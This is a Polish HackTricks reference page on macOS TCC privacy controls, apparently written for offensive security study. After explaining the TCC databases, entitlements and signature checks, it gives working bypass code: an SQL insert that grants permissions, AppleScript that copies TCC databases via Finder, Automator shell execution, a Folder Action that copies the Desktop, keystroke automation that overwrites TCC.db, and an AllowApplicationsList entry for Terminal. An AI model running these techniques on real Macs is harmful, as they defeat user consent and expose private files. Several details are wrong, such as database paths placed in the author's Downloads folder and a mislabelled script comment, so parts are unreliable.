# macOS TCC

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **Podstawowe informacje**

**TCC (Transparency, Consent, and Control)** to protokół bezpieczeństwa, który skupia się na regulowaniu uprawnień aplikacji. Jego głównym zadaniem jest ochrona wrażliwych funkcji, takich jak **usługi lokalizacji, kontakty, zdjęcia, mikrofon, kamera, dostęp do pełnego dysku**. Poprzez wymaganie wyraźnej zgody użytkownika przed udzieleniem aplikacji dostępu do tych elementów, TCC zwiększa prywatność i kontrolę użytkownika nad ich danymi.

Użytkownicy spotykają się z TCC, gdy aplikacje żądają dostępu do chronionych funkcji. Jest to widoczne poprzez monit, który umożliwia użytkownikom **zatwierdzenie lub odmowę dostępu**. Ponadto, TCC uwzględnia bezpośrednie działania użytkownika, takie jak **przeciąganie i upuszczanie plików do aplikacji**, w celu udzielenia dostępu do konkretnych plików, zapewniając, że aplikacje mają dostęp tylko do tego, co jest wyraźnie zezwolone.

![Przykład monitu TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** jest obsługiwane przez **demona** znajdującego się w `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` i skonfigurowane w `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (rejestrując usługę mach `com.apple.tccd.system`).

Istnieje również **tccd w trybie użytkownika**, który działa dla zalogowanego użytkownika i jest zdefiniowany w `/System/Library/LaunchAgents/com.apple.tccd.plist`, rejestrując usługi mach `com.apple.tccd` i `com.apple.usernotifications.delegate.com.apple.tccd`.

Tutaj możesz zobaczyć działanie tccd jako system i jako użytkownik:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Uprawnienia są dziedziczone od aplikacji nadrzędnej, a uprawnienia są śledzone na podstawie identyfikatora pakietu (Bundle ID) i identyfikatora dewelopera (Developer ID).

### Bazy danych TCC

Uprawnienia są przechowywane w bazach danych TCC:

* Baza danych ogólnosystemowa w **`/Library/Application Support/com.apple.TCC/TCC.db`**.
* Ta baza danych jest chroniona przez SIP, więc tylko omijanie SIP pozwala na zapis do niej.
* Baza danych TCC użytkownika w **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** dla preferencji użytkownika.
* Ta baza danych jest chroniona, więc tylko procesy z wysokimi uprawnieniami TCC, takimi jak Pełny dostęp do dysku, mogą zapisywać do niej (ale nie jest chroniona przez SIP).

{% hint style="warning" %}
Wcześniej wymienione bazy danych są również chronione przez TCC przed dostępem do odczytu. Nie będziesz więc mógł odczytać swojej zwykłej bazy danych TCC użytkownika, chyba że jest to proces z uprawnieniami TCC.

Należy jednak pamiętać, że proces z tymi wysokimi uprawnieniami (takimi jak FDA lub `kTCCServiceEndpointSecurityClient`) będzie mógł zapisywać do bazy danych TCC użytkownika.
{% endhint %}

* Istnieje trzecia baza danych TCC w **`/var/db/locationd/clients.plist`**, która wskazuje, które klienty mają dostęp do usług lokalizacji.
* Chroniony przez SIP plik **`/Users/carlospolop/Downloads/REG.db`** (również chroniony przed dostępem do odczytu przez TCC) zawiera lokalizację wszystkich prawidłowych baz danych TCC.
* Chroniony przez SIP plik **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (również chroniony przed dostępem do odczytu przez TCC) zawiera więcej przyznanych uprawnień TCC.
* Chroniony przez SIP plik **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (ale czytelny dla każdego) to lista aplikacji wymagających wyjątku TCC.

{% hint style="success" %}
Baza danych TCC w systemie **iOS** znajduje się w **`/private/var/mobile/Library/TCC/TCC.db`**
{% endhint %}

{% hint style="info" %}
Interfejs **centrum powiadomień** może dokonywać zmian w systemowej bazie danych TCC:

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

Jednak użytkownicy mogą **usuwać lub zapytać o reguły** za pomocą narzędzia wiersza poleceń **`tccutil`**.
{% endhint %}

#### Zapytaj bazy danych

{% tabs %}
{% tab title="Baza danych użytkownika" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="system DB" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
Sprawdzając obie bazy danych można sprawdzić uprawnienia, które aplikacja zezwoliła, zabroniła lub których nie ma (zostaną o nie poproszone).
{% endhint %}

* **`service`** to reprezentacja ciągu znaków **uprawnienia** TCC
* **`client`** to **ID pakietu** lub **ścieżka do pliku binarnego** z uprawnieniami
* **`client_type`** wskazuje, czy jest to identyfikator pakietu (0) czy absolutna ścieżka (1)

<details>

<summary>Jak wykonać, jeśli to jest absolutna ścieżka</summary>

Po prostu wykonaj **`launctl load you_bin.plist`**, z plikiem plist takim jak:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

* **`auth_value`** może mieć różne wartości: denied(0), unknown(1), allowed(2) lub limited(3).
* **`auth_reason`** może przyjąć następujące wartości: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12).
* Pole **csreq** służy do wskazania, jak zweryfikować binarny plik do wykonania i przyznać uprawnienia TCC:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
* Aby uzyskać więcej informacji na temat **innych pól** tabeli, [**sprawdź ten wpis na blogu**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

Możesz również sprawdzić **już udzielone uprawnienia** dla aplikacji w `Preferencje systemowe --> Bezpieczeństwo i prywatność --> Prywatność --> Pliki i foldery`.

{% hint style="success" %}
Użytkownicy _mogą_ **usuwać lub zapytać o zasady** za pomocą **`tccutil`**.
{% endhint %}

#### Zresetuj uprawnienia TCC
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### Sprawdzanie podpisów TCC

Baza danych TCC przechowuje identyfikator pakietu (Bundle ID) aplikacji, ale także przechowuje informacje o podpisie, aby upewnić się, że aplikacja, która prosi o uprawnienia, jest właściwa.

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
Dlatego inne aplikacje o tej samej nazwie i identyfikatorze pakietu nie będą miały dostępu do przyznanych uprawnień innym aplikacjom.
{% endhint %}

### Uprawnienia i zezwolenia TCC

Aplikacje **nie tylko muszą** żądać i otrzymać **dostęp** do niektórych zasobów, muszą również **mieć odpowiednie uprawnienia**.\
Na przykład **Telegram** ma uprawnienie `com.apple.security.device.camera` do żądania **dostępu do kamery**. **Aplikacja**, która **nie ma tego uprawnienia**, nie będzie miała dostępu do kamery (i użytkownik nie zostanie nawet poproszony o zezwolenie).

Jednakże, aby aplikacje miały **dostęp** do **określonych folderów użytkownika**, takich jak `~/Desktop`, `~/Downloads` i `~/Documents`, nie potrzebują żadnych **konkretnych uprawnień**. System automatycznie obsłuży dostęp i **poprosi użytkownika** o zezwolenie, jeśli będzie to konieczne.

Aplikacje Apple **nie generują monitów**. Zawierają one **predefiniowane uprawnienia** na liście **uprawnień**, co oznacza, że **nigdy nie generują okienka dialogowego** ani nie pojawiają się w żadnej z **baz danych TCC**. Na przykład:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
To zapobiec pytaniu Kalendarza o dostęp do przypomnień, kalendarza i książki adresowej.

{% hint style="success" %}
Oprócz oficjalnej dokumentacji dotyczącej uprawnień, można również znaleźć nieoficjalne **ciekawe informacje na temat uprawnień** w [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)
{% endhint %}

Niektóre uprawnienia TCC to: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Nie ma publicznej listy, która definiuje wszystkie z nich, ale można sprawdzić ten [**znany zestaw**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).

### Wrażliwe niechronione miejsca

* $HOME (sam)
* $HOME/.ssh, $HOME/.aws, itp.
* /tmp

### Intencja użytkownika / com.apple.macl

Jak wspomniano wcześniej, możliwe jest **udzielenie dostępu do pliku aplikacji przez przeciągnięcie i upuszczenie go**. Ten dostęp nie będzie określony w żadnej bazie danych TCC, ale jako **rozszerzony atrybut pliku**. Ten atrybut będzie **przechowywał UUID** zezwolonej aplikacji:
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
Ciekawe jest to, że atrybut **`com.apple.macl`** jest zarządzany przez **Sandbox**, a nie przez tccd.

Należy również zauważyć, że jeśli przeniesiesz plik, który umożliwia UUID aplikacji na innym komputerze, to nie przyzna dostępu do tej aplikacji, ponieważ ta sama aplikacja będzie miała różne UID.
{% endhint %}

Rozszerzony atrybut `com.apple.macl` **nie może zostać wyczyszczony** jak inne rozszerzone atrybuty, ponieważ jest **chroniony przez SIP**. Jednak, jak [**wyjaśniono w tym poście**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), można go wyłączyć, **kompresując** plik, go **usuwać** i **rozpakowując** go.

## Eskalacja uprawnień i bypassy TCC

### Wstawianie do TCC

Jeśli w pewnym momencie uda ci się uzyskać dostęp do zapisu w bazie danych TCC, możesz użyć czegoś takiego jak poniżej, aby dodać wpis (usuń komentarze):

<details>

<summary>Przykład wstawiania do TCC</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloady

Jeśli udało Ci się dostać do aplikacji z pewnymi uprawnieniami TCC, sprawdź następującą stronę z payloadami TCC, aby je nadużyć:

{% content-ref url="macos-tcc-payloads.md" %}
[macos-tcc-payloads.md](macos-tcc-payloads.md)
{% endcontent-ref %}

### Automatyzacja (Finder) do FDA\*

Nazwa TCC uprawnienia Automatyzacji to: **`kTCCServiceAppleEvents`**\
To konkretne uprawnienie TCC wskazuje również na **aplikację, którą można zarządzać** w bazie danych TCC (więc uprawnienia nie pozwalają na zarządzanie wszystkim).

**Finder** to aplikacja, która **zawsze ma FDA** (nawet jeśli nie pojawia się w interfejsie użytkownika), więc jeśli masz uprawnienia do Automatyzacji nad nim, możesz nadużyć jego uprawnień, aby **wykonać pewne czynności**.\
W tym przypadku Twoja aplikacja musiałaby mieć uprawnienie **`kTCCServiceAppleEvents`** nad **`com.apple.Finder`**.

{% tabs %}
{% tab title="Ukradnij bazę danych TCC użytkowników" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% tab title="Ukradnij bazę danych TCC systemu" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}
{% endtabs %}

Możesz to wykorzystać, aby **napisać własną bazę danych TCC użytkownika**.

{% hint style="warning" %}
Dzięki temu uprawnieniu będziesz mógł **poprosić Finder o dostęp do ograniczonych folderów TCC** i przekazać Ci pliki, ale o ile mi wiadomo, nie będziesz mógł zmusić Finder do wykonania dowolnego kodu, aby w pełni wykorzystać jego dostęp do FDA.

Dlatego nie będziesz w stanie wykorzystać pełnych możliwości FDA.
{% endhint %}

Oto monit TCC, aby uzyskać uprawnienia Automatyzacji w stosunku do Finder:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>

{% hint style="danger" %}
Zauważ, że ponieważ aplikacja **Automator** ma uprawnienie TCC **`kTCCServiceAppleEvents`**, może **kontrolować dowolną aplikację**, taką jak Finder. Dlatego mając uprawnienia do kontrolowania Automatora, możesz również kontrolować **Finder** za pomocą kodu podobnego do poniższego:
{% endhint %}

<details>

<summary>Uzyskaj dostęp do powłoki wewnątrz Automatora</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

To samo dzieje się z aplikacją **Edytor skryptów**, może ona kontrolować Finder, ale za pomocą AppleScriptu nie można zmusić go do wykonania skryptu.

### Automatyzacja (SE) dla niektórych TCC

**System Events może tworzyć Akcje folderu, a Akcje folderu mogą uzyskać dostęp do niektórych folderów TCC** (Pulpit, Dokumenty i Pobrane), więc skrypt jak poniższy może być wykorzystany do nadużycia tego zachowania:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automatyzacja (SE) + Dostępność (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** do FDA\*

Automatyzacja na **`System Events`** + Dostępność (**`kTCCServicePostEvent`**) pozwala na wysyłanie **naciśnięć klawiszy do procesów**. W ten sposób można nadużyć Finder'a, aby zmienić bazę danych TCC użytkownika lub nadać uprawnienia FDA dowolnej aplikacji (choć może być wymagane podanie hasła).

Przykład nadpisania bazy danych TCC użytkownika przez Finder'a:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` do FDA\*

Sprawdź tę stronę, aby zobaczyć [**payloady do wykorzystania uprawnień dostępności**](macos-tcc-payloads.md#accessibility) w celu eskalacji uprawnień do FDA\* lub uruchomienia keyloggera na przykład.

### **Endpoint Security Client do FDA**

Jeśli masz **`kTCCServiceEndpointSecurityClient`**, masz FDA. Koniec.

### System Policy SysAdmin File do FDA

**`kTCCServiceSystemPolicySysAdminFiles`** pozwala na **zmianę** atrybutu **`NFSHomeDirectory`** użytkownika, który zmienia swoją folder domowy i tym samym umożliwia **ominięcie TCC**.

### User TCC DB do FDA

Uzyskanie **uprawnień do zapisu** w bazie danych **użytkownika TCC** nie pozwala na przyznanie sobie uprawnień **`FDA`**, tylko ta, która znajduje się w bazie danych systemowej, może to zrobić.

Ale możesz **przyznać sobie prawa do automatyzacji Finder** i wykorzystać poprzednią technikę do eskalacji do FDA\*.

### **FDA do uprawnień TCC**

Pełny dostęp do dysku w TCC ma nazwę **`kTCCServiceSystemPolicyAllFiles`**

Nie sądzę, że to jest prawdziwa eskalacja uprawnień, ale na wszelki wypadek, jeśli kontrolujesz program z uprawnieniami FDA, możesz **modyfikować bazę danych TCC użytkowników i przyznać sobie dowolny dostęp**. Może to być przydatne jako technika trwałości w przypadku utraty uprawnień FDA.

### **SIP Bypass do TCC Bypass**

Baza danych systemowa TCC jest chroniona przez SIP, dlatego tylko procesy z odpowiednimi uprawnieniami będą mogły ją modyfikować. Dlatego jeśli atakujący znajdzie **SIP bypass** dla **pliku** (może modyfikować plik ograniczony przez SIP), będzie mógł:

* **Usunąć ochronę** bazy danych TCC i przyznać sobie wszystkie uprawnienia TCC. Może na przykład wykorzystać dowolne z tych plików:
* Baza danych systemowa TCC
* REG.db
* MDMOverrides.plist

Jednak istnieje inna opcja wykorzystania tego **SIP bypass do ominięcia TCC**, plik `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` to lista aplikacji wymagających wyjątku TCC. Dlatego jeśli atakujący może **usunąć ochronę SIP** z tego pliku i dodać swoją **własną aplikację**, aplikacja będzie mogła ominąć TCC.\
Na przykład, aby dodać terminal:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:

Ten plik jest używany w systemie macOS do zarządzania listą aplikacji, które mają uprawnienia dostępu do chronionych danych użytkownika. Plik ten zawiera listę aplikacji, które zostały zezwolone na dostęp do takich danych, jak kontakty, kalendarz, lokalizacja itp. 

Aby dodać aplikację do listy zezwoleń, należy edytować ten plik i dodać odpowiedni wpis dla danej aplikacji. Wpis ten powinien zawierać identyfikator pakietu aplikacji oraz uprawnienia, które aplikacja ma otrzymać. 

Ważne jest, aby zachować ostrożność podczas edycji tego pliku, ponieważ nieprawidłowe modyfikacje mogą prowadzić do naruszenia prywatności użytkownika lub innych problemów z bezpieczeństwem.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### Bypassy TCC

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## Referencje

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
